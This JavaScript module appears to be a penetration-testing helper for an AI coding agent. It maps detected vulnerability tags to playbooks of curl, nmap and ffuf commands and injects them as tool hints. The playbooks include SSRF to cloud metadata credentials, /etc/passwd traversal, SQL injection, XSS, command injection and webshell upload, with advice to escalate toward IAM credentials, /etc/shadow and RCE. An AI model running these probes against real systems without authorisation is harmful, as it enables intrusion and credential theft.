import { buildTransport, readProbability, postWithRetry } from "./jev.mjs";
import { log } from "./log.mjs";

export const TOOL_DESCRIPTIONS = {
  Bash: "Run CLI commands: curl, nmap, ffuf, sqlmap, nuclei, python scripts",
  Grep: "Search patterns in code, responses, or log files using ripgrep",
  Read: "Read file contents to analyze source code, configs, or responses",
  FileEdit: "Edit or create files: exploit scripts, payloads, configs",
  WebSearch: "Search the web for CVEs, exploits, bypass techniques, writeups",
  MCP: "Call external MCP tools like Burp Suite, Shodan, custom scanners",
};

export const SECURITY_PLAYBOOKS = {
  "ssrf": {
    tool: "Bash",
    commands: [
      'curl -s "{endpoint}?url=http://169.254.169.254/latest/meta-data/"',
      'curl -s "{endpoint}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
    ],
    nextSteps: "If AWS metadata is returned, escalate to IAM credentials. Try other cloud providers (GCP, Azure) or internal IP ranges.",
  },
  "path-traversal": {
    tool: "Bash",
    commands: [
      'curl -s "{endpoint}?file=../../../../etc/passwd"',
      'curl -s "{endpoint}?file=....//....//....//....//etc/passwd"',
    ],
    nextSteps: "If file content is returned, try reading sensitive files: /etc/shadow, app config, .env files, or proc/self/environ.",
  },
  "sqli": {
    tool: "Bash",
    commands: [
      "curl -s \"{endpoint}?id=1' OR '1'='1\"",
      "curl -s \"{endpoint}?id=1 UNION SELECT NULL,NULL,NULL--\"",
    ],
    nextSteps: "Determine column count, then extract database version and table names via UNION, error-based, or time-based blind injection.",
  },
  "xss": {
    tool: "Bash",
    commands: [
      'curl -s "{endpoint}?q=<script>alert(document.domain)</script>"',
      'curl -s "{endpoint}?q=<img src=x onerror=alert(1)>"',
    ],
    nextSteps: "Inspect reflected response or DOM sink. Test attribute escape, event handler injection, or encoding bypasses.",
  },
  "idor": {
    tool: "Bash",
    commands: [
      'curl -s -H "Authorization: Bearer $USER_TOKEN" "{endpoint}?user_id=VICTIM_ID"',
      'curl -s -X PUT -H "Authorization: Bearer $USER_TOKEN" -d \'{"role":"admin"}\' "{endpoint}?user_id=VICTIM_ID"',
    ],
    nextSteps: "Verify if user A can view or mutate records belonging to user B without authorization errors.",
  },
  "command-injection": {
    tool: "Bash",
    commands: [
      'curl -s "{endpoint}?cmd=id;whoami"',
      'curl -s "{endpoint}?ip=127.0.0.1%20%7C%20id"',
    ],
    nextSteps: "Check if command output is returned in response. If blind, test time delay (sleep 5) or out-of-band DNS ping.",
  },
  "ssti": {
    tool: "Bash",
    commands: [
      'curl -s "{endpoint}?template={{7*7}}"',
      'curl -s "{endpoint}?template=${7*7}"',
    ],
    nextSteps: "If 49 is returned, identify template engine (Jinja2, Twig, Freemarker, Mako) and craft remote code execution payload.",
  },
  "open-redirect": {
    tool: "Bash",
    commands: [
      'curl -s -I "{endpoint}?redirect=https://example.com"',
      'curl -s -I "{endpoint}?redirect=//example.com"',
    ],
    nextSteps: "Check Location header in HTTP 30x response. Test bypasses like `///`, `/@example.com`, or URL encoded characters.",
  },
  "auth-bypass": {
    tool: "Bash",
    commands: [
      'curl -s -H "X-Forwarded-For: 127.0.0.1" "{endpoint}"',
      'curl -s -H "Authorization: Bearer invalid" -H "X-Original-URL: /admin" "{endpoint}"',
    ],
    nextSteps: "Test missing authentication on sensitive endpoints, JWT algorithm confusion (alg=none), or header-based ACL bypass.",
  },
  "cloud-misconfig": {
    tool: "Bash",
    commands: [
      'aws s3 ls s3://TARGET_BUCKET --no-sign-request',
      'curl -s -I "https://TARGET_BUCKET.s3.amazonaws.com"',
    ],
    nextSteps: "Check for unauthenticated bucket access, public write permissions, or exposed cloud storage keys in client-side code.",
  },
  "recon": {
    tool: "Bash",
    commands: [
      'ffuf -u "{endpoint}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403',
      'nmap -sV -sC -T4 TARGET_HOST',
    ],
    nextSteps: "Analyze discovered endpoints, virtual hosts, or open ports. Filter status codes and fuzz for hidden parameters.",
  },
  "api-security": {
    tool: "Bash",
    commands: [
      'curl -s -X POST -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name}}}"}\' "{endpoint}"',
      'curl -s "{endpoint}/swagger.json"',
    ],
    nextSteps: "Check for GraphQL introspection, exposed swagger/OpenAPI docs, or mass assignment vulnerabilities on POST/PUT endpoints.",
  },
  "race-condition": {
    tool: "Bash",
    commands: [
      'for i in {1..10}; do curl -s -X POST "{endpoint}" & done; wait',
    ],
    nextSteps: "Analyze concurrency behavior (e.g. coupon reuse, overdraft). Use single-packet attack via turbo-intruder or HTTP/2 multiplexing.",
  },
  "file-upload": {
    tool: "Bash",
    commands: [
      'curl -s -F "file=@shell.php.png;type=image/png" "{endpoint}"',
      'curl -s -F "file=@test.svg;type=image/svg+xml" "{endpoint}"',
    ],
    nextSteps: "Verify if uploaded file is stored in web root. Test extension bypasses (.phtml, .php5) and content-type validation.",
  },
  "deserialization": {
    tool: "Bash",
    commands: [
      'curl -s -X POST -H "Content-Type: application/octet-stream" --data-binary @payload.bin "{endpoint}"',
    ],
    nextSteps: "Identify serialization format (Java, Python pickle, PHP, .NET) and generate gadget chain for remote code execution.",
  },
};

const TAG_KEYWORDS = {
  "ssrf": ["ssrf", "server-side request forgery", "metadata", "169.254", "internal network", "intranet", "webhook"],
  "path-traversal": ["path traversal", "directory traversal", "traversal", "lfi", "local file", "etc/passwd", "dot dot", "../"],
  "sqli": ["sqli", "sql injection", "union select", "blind sql", "database", "sql"],
  "xss": ["xss", "cross-site scripting", "alert(", "script", "dom xss"],
  "idor": ["idor", "direct object", "access control", "privilege", "user_id"],
  "command-injection": ["command injection", "rce", "remote code", "reverse shell", "os command", "exec"],
  "ssti": ["ssti", "template injection", "jinja", "twig", "{{"],
  "open-redirect": ["open redirect", "redirect bypass", "redirect"],
  "auth-bypass": ["auth bypass", "authentication", "jwt", "broken auth", "bearer"],
  "cloud-misconfig": ["s3 bucket", "aws", "gcp", "azure", "cloud storage"],
  "recon": ["recon", "subdomain", "port scan", "ffuf", "nmap", "enumeration"],
  "api-security": ["graphql", "swagger", "api", "rest api", "endpoint"],
  "race-condition": ["race condition", "toctou", "concurrency", "race"],
  "file-upload": ["file upload", "upload", "webshell", "multipart"],
  "deserialization": ["deserialization", "pickle", "unserialize", "yaml load"],
};

/**
 * Static heuristic matcher for security playbooks.
 * Ranks tags in securityContext based on prompt keywords, detected keywords, and detected params.
 */
export function matchPlaybookByKeywords(prompt, securityContext) {
  if (!securityContext || !Array.isArray(securityContext.security_context) || securityContext.security_context.length === 0) {
    return null;
  }

  const tags = securityContext.security_context;
  const pLower = (prompt || "").toLowerCase();

  let bestTag = tags[0];
  let highestScore = -1;

  for (const tag of tags) {
    let score = 0;
    const tagNorm = tag.toLowerCase();
    if (pLower.includes(tagNorm)) score += 5;

    const keywords = TAG_KEYWORDS[tag] || [];
    for (const kw of keywords) {
      if (pLower.includes(kw)) score += 3;
    }

    if (securityContext.detected_keywords) {
      for (const dkw of securityContext.detected_keywords) {
        if (keywords.includes(dkw.toLowerCase())) score += 2;
      }
    }

    if (score > highestScore) {
      highestScore = score;
      bestTag = tag;
    }
  }

  const playbook = SECURITY_PLAYBOOKS[bestTag];
  if (!playbook) return null;

  // Check if the prompt specifically calls for a non-bash tool
  let tool = playbook.tool || "Bash";
  if (/\b(?:grep|search code|find in files|find pattern)\b/i.test(pLower)) {
    tool = "Grep";
  } else if (/\b(?:read file|view file|inspect source|check code)\b/i.test(pLower)) {
    tool = "Read";
  } else if (/\b(?:write script|create file|edit file|save exploit)\b/i.test(pLower)) {
    tool = "FileEdit";
  } else if (/\b(?:search web|cve|writeup|exploit-db|google)\b/i.test(pLower)) {
    tool = "WebSearch";
  } else if (/\b(?:burp|burpsuite|mcp)\b/i.test(pLower)) {
    tool = "MCP";
  }

  return { tag: bestTag, playbook, tool };
}

/**
 * Queries the Jev evaluation model to rank available tools for the current prompt and security context.
 */
export async function askJevForTool(prompt, securityContext, tools = Object.keys(TOOL_DESCRIPTIONS), cfg = {}, provider = null) {
  if (!provider || provider.kind === "fallback" || provider.kind === "disabled") {
    return null;
  }

  const transport = buildTransport(provider, cfg);
  const questions = {};
  for (const tool of tools) {
    const desc = TOOL_DESCRIPTIONS[tool] || tool;
    questions[tool] = {
      type: transport.questionType,
      instructions: {
        claim: `The ${tool} tool (${desc}) is the most suitable tool to investigate or exploit the security vulnerability described in the state.`,
        tool_name: tool,
        description: desc,
      },
    };
  }

  const state = {
    task: "Select the best tool for the security investigation or testing task",
    prompt: prompt || "",
    security_context: securityContext?.security_context || [],
    detected_params: securityContext?.detected_params || [],
    endpoints: securityContext?.endpoints || [],
  };

  const timeoutMs = cfg.security?.toolHints?.jevTimeoutMs ?? 5000;
  const maxRetries = 1;

  try {
    const json = await postWithRetry(transport.url, transport.body(questions, state), transport.headers, {
      timeoutMs,
      maxRetries,
    });
    const answers = json?.answers || {};
    const ranked = [];
    for (const tool of tools) {
      const prob = readProbability(answers[tool]);
      if (prob !== null) {
        ranked.push({ tool, score: prob });
      }
    }
    ranked.sort((a, b) => b.score - a.score);
    return ranked;
  } catch (err) {
    log.debug(`askJevForTool failed: ${err.message}`);
    return null;
  }
}

/**
 * Builds the tool hint string to inject into Claude Code's additionalContext.
 */
export async function buildToolHint(prompt, securityContext, cfg = {}, provider = null) {
  if (cfg?.security?.toolHints?.enabled === false) return null;
  if (!securityContext || !Array.isArray(securityContext.security_context) || securityContext.security_context.length === 0) {
    return null;
  }

  const matched = matchPlaybookByKeywords(prompt, securityContext);
  if (!matched) return null;

  let recommendedTool = matched.tool;
  const confidenceThreshold = cfg?.security?.toolHints?.confidenceThreshold ?? 0.5;

  if (provider && provider.kind !== "fallback" && provider.kind !== "disabled") {
    try {
      const ranked = await askJevForTool(prompt, securityContext, Object.keys(TOOL_DESCRIPTIONS), cfg, provider);
      if (ranked && ranked.length > 0 && ranked[0].score >= confidenceThreshold) {
        recommendedTool = ranked[0].tool;
      }
    } catch {
      // Fallback to static matched tool
    }
  }

  const rawEndpoint = securityContext.endpoints?.[0] || "http://TARGET";
  const endpoint = rawEndpoint.replace(/[?&][^?&]*$/, "").replace(/\?$/, "");
  const commands = matched.playbook.commands.map((cmd) => cmd.replace(/\{endpoint\}/g, endpoint));

  const tags = securityContext.security_context.join(", ");
  const paramStr = securityContext.detected_params?.length > 0
    ? `, params: ${securityContext.detected_params.slice(0, 3).join(", ")}`
    : "";
  const tagUpper = matched.tag.toUpperCase();

  const maxPlaybookLines = cfg?.security?.toolHints?.maxPlaybookLines ?? 8;

  const headerLines = [
    `[Tool Hint] Recommended tool: ${recommendedTool}`,
    `Context: ${tagUpper} indicators detected (tags: ${tags}${paramStr})`,
    "Suggested commands:",
  ];
  const nextStepLine = `Next steps: ${matched.playbook.nextSteps}`;

  const overhead = headerLines.length + 1;
  const availableCommandSlots = Math.max(1, maxPlaybookLines - overhead);
  const slicedCommands = commands.slice(0, availableCommandSlots);

  const formattedCommands = slicedCommands.map((c) => `  ${c}`).join("\n");

  return [
    ...headerLines,
    formattedCommands,
    nextStepLine,
  ].join("\n");
}
